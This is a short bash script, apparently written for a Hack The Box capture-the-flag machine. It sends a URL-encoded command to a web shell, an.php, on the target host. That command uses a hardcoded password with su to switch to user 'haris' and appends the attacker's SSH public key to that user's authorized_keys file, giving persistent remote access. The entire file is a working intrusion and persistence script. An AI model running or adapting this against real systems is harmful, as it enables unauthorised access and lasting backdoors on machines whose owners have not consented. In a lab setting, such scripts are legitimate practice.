#!/usr/bin/env bash
# Install local ed25519 pubkey into haris authorized_keys via an.php
set -euo pipefail

IP="${1:-}"
PUBKEY_FILE="${2:-$HOME/.ssh/id_ed25519_htb.pub}"
if [[ -z "$IP" ]] || [[ ! -f "$PUBKEY_FILE" ]]; then
  echo "Usage: $0 <target_ip> [pubkey_file]" >&2
  exit 1
fi

PUB=$(cat "$PUBKEY_FILE")
HOST_HDR='Host: support_001.enigma.htb'
BASE="http://${IP}"

CMD=$(printf "printf 'bestfriends\\n' | su haris -c 'mkdir -p ~/.ssh && echo %s >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys'" "$PUB")
ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$CMD")

curl -s -H "$HOST_HDR" "${BASE}/an.php?c=${ENC}"
echo
echo "[*] Try: ssh -i ${PUBKEY_FILE%.pub} haris@${IP}"